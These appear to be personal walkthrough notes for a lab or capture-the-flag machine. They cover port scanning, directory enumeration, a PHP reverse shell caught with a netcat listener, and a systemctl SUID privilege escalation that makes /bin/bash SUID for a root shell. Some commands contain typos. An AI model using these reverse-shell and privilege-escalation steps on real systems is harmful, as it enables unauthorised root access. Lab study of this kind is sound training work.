``` IP : 10.10.62.229 ```

# Nmap scan

nmap -sC -sV -oN initial 10.10.62.229


```

21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))

```
# Top ports

* nmap -sU --top-ports 20 | --top-ports

# Aggressive for ports over 1000

nmap -A -p- -sC -sV -oN nmap/Allport 10.10.62.229


# Gobuster to find directories

gobuster dir -u http://10.10.62.229:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


# Nikto

nikto -h "10.10.62.229:3333"

# Use php reverse shell -> change ip 2 urip and port

# listen on Netcat

nc -lnvp 9000

* python -c "import pty; pty.spawn('/bin/bash')" //stable shell
* ctr+Z
* stty raw -echo
* specify fg
* export TERM=xterm

# find user

cat /etc/passwd -> check setuid -> ls -l /etc/bin/passwd

# find files with setuid

find / -perm - 4000 2>/dev/null   

# uing bash -p to execute as root --gtd=fobins.github.io

`GTFOBind`
```
sudo sh -c 'cp $(which systemctl) .; chmod +s ./systemctl'

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

#edited

```  
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

# now sets /bin/bash as suid (ls -l /bin/bash)

# bash -p

# now explore
